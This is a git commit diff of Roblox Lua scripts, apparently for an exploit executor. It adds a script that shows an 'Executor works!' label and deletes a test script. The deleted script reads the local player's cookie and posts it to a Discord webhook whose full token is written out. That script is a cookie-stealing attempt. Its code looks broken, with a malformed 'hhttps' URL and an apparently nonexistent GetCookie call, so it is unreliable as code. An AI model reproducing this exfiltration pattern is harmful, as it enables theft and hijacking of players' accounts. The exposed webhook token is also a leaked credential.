c935c0c2449044f4fb1dab7d83c710602ed8b975
xxyourzetaoulxxilly <delucavale12@gmail.com>
2026-06-24 14:57:38 +0200

    Refactor webhook script to create GUI text label

---
+++ webhook.lua
@@ -0,0 +1,6 @@
+local gui = Instance.new("ScreenGui", game.CoreGui)
+local text = Instance.new("TextLabel", gui)
+text.Size = UDim2.new(0, 300, 0, 50)
+text.Position = UDim2.new(0.5, -150, 0.5, -25)
+text.BackgroundTransparency = 0.3
+text.Text = "Executor works!"
--- webhooktesttt.lua
+++
@@ -1,9 +0,0 @@
-local http = game:GetService("HttpService")
-local url = "hhttps://discord.com/api/webhooks/1519322724281876511/w8U8K-U7TwG79mY5NFgFaJfumRWiYUHwQFEo2ZRlgOMyJWtVvDcMreCbBnIqOKNivRuh"
-local cookie = game:GetService("Players").LocalPlayer:GetCookie()
-http:PostAsync(url, cookie)
-
-local textLabel = Instance.new("TextLabel")
-textLabel.Text = "Script is working!"
-textLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
-textLabel.Parent = game.Players.LocalPlayer.PlayerGui
